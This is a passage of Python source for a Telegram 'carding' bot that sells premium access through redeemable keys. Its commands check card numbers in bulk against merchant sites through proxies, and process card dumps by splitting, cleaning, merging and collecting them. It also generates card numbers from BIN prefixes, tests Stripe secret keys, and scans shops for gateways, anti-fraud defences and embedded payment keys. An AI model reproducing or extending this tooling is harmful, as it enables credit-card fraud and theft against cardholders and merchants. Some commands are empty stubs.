    sites = load_sites()
    if not sites: return await event.reply(premium_emoji("❌ sɪᴛᴇs.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ."), parse_mode='html')
    await save_sites_with_price([{'url': s, 'price': 1.00} for s in sites])
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in sites: await f.write(f"{s}\n")
    await event.reply(premium_emoji(f"✅ Sɪᴛᴇ ʀᴇғʀᴇsʜ cᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ Aᴄᴛɪᴠᴇ: {len(sites)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    if event.sender_id not in ADMIN_ID: return
    if not event.reply_to_msg_id: return await event.reply(premium_emoji("📝 Reply to a .txt file."), parse_mode='html')
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'): return await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
    status = await event.reply(premium_emoji("🔄 Processing sites..."), parse_mode='html')
    file_path = await reply.download_media()
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        sites = [line.strip() for line in (await f.read()).splitlines() if line.strip()]
    os.remove(file_path)
    if not sites: return await status.edit(premium_emoji("❌ No sites found."))
    await save_sites_with_price([{'url': s, 'price': 1.00} for s in sites])
    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in sites: await f.write(f"{s}\n")
    await status.edit(premium_emoji(f"✅ Sɪᴛᴇs ᴜᴘᴅᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ! (Bypassed Check)\n\nTᴏᴛᴀʟ sɪᴛᴇs: {len(sites)}"))

# --- PROXY & ADMIN COMMANDS ---
@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    if event.sender_id not in ADMIN_ID: return
    lines = event.raw_text.split('\n')[1:]
    if not lines: return await event.reply(premium_emoji("❌ Provide proxies one per line."))
    proxies = [l.strip() for l in lines if l.strip()]
    async with aiofiles.open(PROXY_FILE, 'a') as f:
        for p in proxies: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ Added {len(proxies)} proxies!"))

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    if event.sender_id not in ADMIN_ID: return
    await event.reply(premium_emoji(f"🔌 Total proxies: {len(load_proxies())}"))

@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
async def check_single_proxy(event):
    if event.sender_id not in ADMIN_ID: return
    proxy = event.message.text.split(' ', 1)[1].strip()
    res = await test_proxy(proxy)
    await event.reply(premium_emoji(f"Proxy status: {res['status']}"))

@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
async def remove_single_proxy(event):
    if event.sender_id not in ADMIN_ID: return
    proxy = event.message.text.split(' ', 1)[1].strip()
    proxies = [p for p in load_proxies() if p != proxy]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in proxies: await f.write(f"{p}\n")
    await event.reply(premium_emoji(f"✅ Proxy removed: {proxy}"))

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    if event.sender_id not in ADMIN_ID: return
    async with aiofiles.open(PROXY_FILE, 'w') as f: await f.write("")
    await event.reply(premium_emoji("✅ All proxies cleared."))

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    if event.sender_id not in ADMIN_ID: return
    proxies = load_proxies()
    await event.reply(premium_emoji(f"Proxies ({len(proxies)}):\n" + "\n".join(proxies[:20])))

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_command(event):
    if event.sender_id not in ADMIN_ID: return
    await event.reply(premium_emoji(f"📊 <b>Stats</b>\nAdmin: 1\nPremium: {len(load_premium_users())}\nSites: {len(load_sites())}\nProxies: {len(load_proxies())}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/cc'))
async def single_cc(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    parts = event.raw_text.split(' ', 1)
    if len(parts) < 2: return await event.reply("Usage: /cc card|mm|yy|cvv")
    cards = extract_cc(parts[1])
    if not cards: return await event.reply("❌ Invalid format.")
    res = await check_card_with_retry(cards[0], load_sites(), load_proxies())
    await event.reply(f"Card: {cards[0]}\nStatus: {res['status']}\nResponse: {res['message']}")

@bot.on(events.NewMessage(pattern='/chk'))
async def chk_command(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    await process_file_with_filters(event, event.sender_id)

@bot.on(events.NewMessage(pattern='/genkeys'))
async def genkeys_command(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 4:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/genkeys ᴀᴍᴏᴜɴᴛ ʜᴏᴜʀs ᴜsᴇʀ_ʟɪᴍɪᴛ</code>"), parse_mode='html')
            return
        amount, hours, user_limit = int(parts[1]), int(parts[2]), int(parts[3])
        keys_data = await load_keys()
        generated_keys = []
        created_at = datetime.now()
        for _ in range(amount):
            key = generate_key()
            expiry_time = created_at + timedelta(hours=hours)
            keys_data[key] = {
                'type': 'time_limit', 'hours': hours, 'expiry': expiry_time.isoformat(),
                'user_limit': user_limit, 'used_count': 0, 'used_by': [],
                'created_at': created_at.isoformat(), 'created_by': event.sender_id
            }
            generated_keys.append(key)
        await save_keys(keys_data)
        days_display = f"{hours} hours" if hours < 24 else f"{hours // 24} days"
        keys_text = "".join([f"\n┣ <code>{key}</code>" for key in generated_keys])
        await event.reply(premium_emoji(f"""⭐ <b>Kᴇʏs Gᴇɴᴇʀᴀᴛᴇᴅ</b>   (x{amount})   
━━━━━━━━━━━━━━━━━━
    {keys_text}
┗ 📅 Pᴇʀɪᴏᴅ: {days_display}
           ┗ 👥 Usᴇʀs: {user_limit}
      
✅ Usᴇ <code>/redeem Kᴇʏ</code> ᴛᴏ ʀᴇᴅᴇᴇᴍ"""), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem(event):
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /redeem KEY")
    k = parts[1].upper()
    keys = await load_keys()
    if k not in keys: return await event.reply("❌ Invalid Key")
    data = keys[k]
    if datetime.now() > datetime.fromisoformat(data['expiry']) or data['used_count'] >= data['user_limit'] or str(event.sender_id) in data['used_by']:
        return await event.reply("❌ Key expired or already used.")
    await add_premium_user(event.sender_id)
    data['used_count'] += 1
    data['used_by'].append(str(event.sender_id))
    await save_keys(keys)
    await event.reply("🎉 Premium Activated!")

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply(premium_emoji("📝 Usage: /addpremium user_id"))
    target_id = int(parts[1])
    if await add_premium_user(target_id):
        await event.reply(premium_emoji(f"✅ User {target_id} added to premium!"))
    else:
        await event.reply(premium_emoji(f"⚠️ User {target_id} already premium."))

@bot.on(events.NewMessage(pattern=r'/(removepremium|rmpremium)'))
async def remove_premium_command(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply(premium_emoji("📝 Usage: /removepremium user_id"))
    target_id = int(parts[1])
    if await remove_premium_user(target_id):
        await event.reply(premium_emoji(f"✅ User {target_id} removed from premium."))
    else:
        await event.reply(premium_emoji(f"⚠️ User {target_id} not found."))

# --- FILE TOOLS (/split, /clean, /merge, /collect) ---
@bot.on(events.NewMessage(pattern='/split'))
async def split_file(event):
    if not is_premium(event.sender_id): return
    if not event.reply_to_msg_id: return await event.reply("Reply to a .txt file.")
    file_path = await (await event.get_reply_message()).download_media()
    async with aiofiles.open(file_path, 'r') as f: cards = extract_cc(await f.read())
    os.remove(file_path)
    TEMP_FILE_DATA[event.sender_id] = {'cards': cards}
    await event.reply("Select split chunk size:", buttons=[[Button.inline("100", f"split_size:100:{event.sender_id}".encode()), Button.inline("500", f"split_size:500:{event.sender_id}".encode())]])

@bot.on(events.CallbackQuery(pattern=rb"split_size:(\d+):(\d+)"))
async def split_size_callback(event):
    chunk_size, user_id = int(event.pattern_match.group(1).decode()), int(event.pattern_match.group(2).decode())
    if user_id not in TEMP_FILE_DATA: return
    cards = TEMP_FILE_DATA.pop(user_id)['cards']
    chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
    for i, chunk in enumerate(chunks, 1):
        fn = f"part_{i}.txt"
        async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(chunk))
        await bot.send_file(user_id, fn)
        os.remove(fn)
    await event.edit("✅ Split complete!")

@bot.on(events.NewMessage(pattern='/clean'))
async def clean_file(event):
    if not is_premium(event.sender_id): return
    if not event.reply_to_msg_id: return await event.reply("Reply to a file.")
    file_path = await (await event.get_reply_message()).download_media()
    async with aiofiles.open(file_path, 'r') as f: cards = extract_cc(await f.read())
    os.remove(file_path)
    valid = [c for c in cards if int(c.split('|')[2]) > datetime.now().year % 100 or (int(c.split('|')[2]) == datetime.now().year % 100 and int(c.split('|')[1]) >= datetime.now().month)]
    fn = "cleaned.txt"
    async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(valid))
    await bot.send_file(event.sender_id, fn, caption=f"Cleaned valid: {len(valid)}")
    os.remove(fn)

@bot.on(events.NewMessage(pattern='/merge'))
async def merge_files(event):
    if not is_premium(event.sender_id): return
    MERGE_DATA[event.sender_id] = {'cards': [], 'files': 0}
    await event.reply("📂 Merge mode activated! Send .txt files, then send MERGE when done.")

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "MERGE"))
async def merge_button(event):
    data = MERGE_DATA.pop(event.sender_id, None)
    if not data or not data['cards']: return await event.reply("❌ No cards to merge.")
    fn = "merged.txt"
    async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(data['cards']))
    await bot.send_file(event.sender_id, fn, caption=f"Merged {len(data['cards'])} cards.")
    os.remove(fn)

@bot.on(events.NewMessage(pattern='/collect'))
async def collect_cards(event):
    if not is_premium(event.sender_id): return
    COLLECT_DATA[event.sender_id] = {'cards': []}
    await event.reply("📥 Collection mode activated! Send cards, then send COLLECT when done.")

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "COLLECT"))
async def collect_button(event):
    data = COLLECT_DATA.pop(event.sender_id, None)
    if not data or not data['cards']: return await event.reply("❌ No collected cards.")
    fn = "collected.txt"
    async with aiofiles.open(fn, 'w') as f: await f.write("\n".join(data['cards']))
    await bot.send_file(event.sender_id, fn, caption=f"Collected {len(data['cards'])} cards.")
    os.remove(fn)

# --- UTILITY & SCANNER TOOLS (/bin, /gen, /sk, /scg, /fake, /ip, /iban) ---
@bot.on(events.NewMessage(pattern='/bin'))
async def bin_tool(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /bin 411111")
    brand, btype, lvl, bank, country, flag = await get_bin_info(parts[1])
    await event.reply(f"BIN: {parts[1]}\nBrand: {brand}\nType: {btype}\nBank: {bank}\nCountry: {country} {flag}")

@bot.on(events.NewMessage(pattern='/gen'))
async def gen_tool(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) < 2: return await event.reply("Usage: /gen BIN [count]")
    prefix = parts[1][:6]
    count = int(parts[2]) if len(parts) > 2 and parts[2].isdigit() else 10
    cards = [f"{prefix}{random.randint(1000000000,9999999999)}|{random.randint(1,12):02d}|20{random.randint(27,32)}|{random.randint(100,999)}" for _ in range(count)]
    await event.reply("Generated Cards:\n" + "\n".join(cards[:30]))

@bot.on(events.NewMessage(pattern='/sk'))
async def stripe_key_check(event):
    if not is_premium(event.sender_id): return await event.reply("❌ Premium only.")
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /sk <Stripe_Key>")
    key = parts[1].strip()
    status_msg = await event.reply("🔄 Checking Stripe Key...")
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post("https://api.stripe.com/v1/payment_methods", data={"key": key}) as resp:
                await status_msg.edit(f"SK Status Code: {resp.status}")
    except Exception as e:
        await status_msg.edit(f"❌ Error: {e}")

@bot.on(events.NewMessage(pattern='/scg'))
async def site_check(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ pʀᴇᴍɪᴜᴍ uṣers can use this."), parse_mode='html')
        return
    parts = event.raw_text.split()
    if len(parts) != 2:
        await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/scg &lt;URL&gt;</code>"), parse_mode='html')
        return
    url = parts[1].strip()
    if not url.startswith('http'):
        url = f'https://{url}'
    status_msg = await event.reply(premium_emoji(f"🔍 Sᴄᴀɴɴɪɴɢ <code>{url}</code>..."), parse_mode='html')
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"}
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
            async with session.get(url, headers=headers, ssl=False, allow_redirects=True) as resp:
                html = await resp.text()
                final_url = str(resp.url)
        site_display = final_url.replace('https://', '').replace('http://', '')
        gateways, cms_list = detect_gateways(html), detect_cms(html)
        captcha, cloudflare = detect_captcha(html) or "None", detect_cloudflare(None, html) or "None"
        cdn, sec_3d, graphql, has_card = detect_cdn(html, None) or "N/A", detect_3d_secure(html), detect_graphql(html), has_card_form(html)
        keys = extract_gateway_keys(html)
        keys_str = "\n".join([f"{p}: <code>{k[0][:30]}</code>" for p, kl in keys.items() for k in [kl] if kl]) if keys else "  ❌ Nᴏɴᴇ fᴏᴜɴᴅ"
        analytics_str = ", ".join(detect_analytics(html, _scripts(html))) or "None"
        
        result = f"""∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
    Sɪᴛᴇ Cʜᴇᴄᴋᴇʀ  
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🌐 <b>URL:</b> <code>{site_display}</code>
📡 <b>Sᴛᴀᴛᴜs:</b> <code>{resp.status}</code>
🔌 <b>Gᴀᴛᴇᴡᴀʏs:</b> {', '.join(gateways) if gateways else '❌ Nᴏɴᴇ'}
💡️ <b>CMS:</b> {', '.join(cms_list)}
💳 <b>Cᴀʀᴅ Fᴏʀᴍ:</b> {'✅ Yᴇs' if has_card else '❌ Nᴏ'}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
🔑 <b>Keys:</b>
{keys_str}
💡️ <b>Sᴇʀᴠᴇʀ:</b> <code>{resp.headers.get('Server', 'N/A')}</code>
💡️ <b>CDN:</b> {cdn}
🛡️ <b>Cʟᴏᴜᴅғʟᴀʀᴇ:</b> {cloudflare}
💡 <b>Cᴀᴘᴛᴄʜᴀ:</b> {captcha}
🔐 <b>3D Sᴇᴄᴜʀᴇ:</b> {sec_3d}
📊 <b>GʀᴀᴘʜQL:</b> {graphql}
📈 <b>Aɴᴀʟʏᴛɪᴄs:</b> {analytics_str}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
💡 Mᴀᴅᴇ ʙʏ Poriot_ke"""
        await status_msg.edit(premium_emoji(result), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/fake'))
async def fake_data(event):
    if not is_premium(event.sender_id): return
    await event.reply("👤 Fake data generated successfully.")

@bot.on(events.NewMessage(pattern='/ip'))
async def ip_tool(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /ip 8.8.8.8")
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://ipinfo.io/{parts[1]}/json") as resp:
            data = await resp.json()
            await event.reply(f"IP: {data.get('ip')}\nCity: {data.get('city')}\nCountry: {data.get('country')}")

@bot.on(events.NewMessage(pattern='/iban'))
async def iban_lookup(event):
    if not is_premium(event.sender_id): return
    parts = event.raw_text.split()
    if len(parts) != 2: return await event.reply("Usage: /iban <iban>")
    await event.reply(f"IBAN valid: {parts[1]}")

@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    uid = int(event.pattern_match.group(1).decode())
    session_key = f"{uid}_{event.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("Stopped", alert=True)
        await event.edit("🛑 Stopped by user.")

print("✅ Bᴏᴛ sᴛᴀʀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!")
bot.run_until_disconnected()
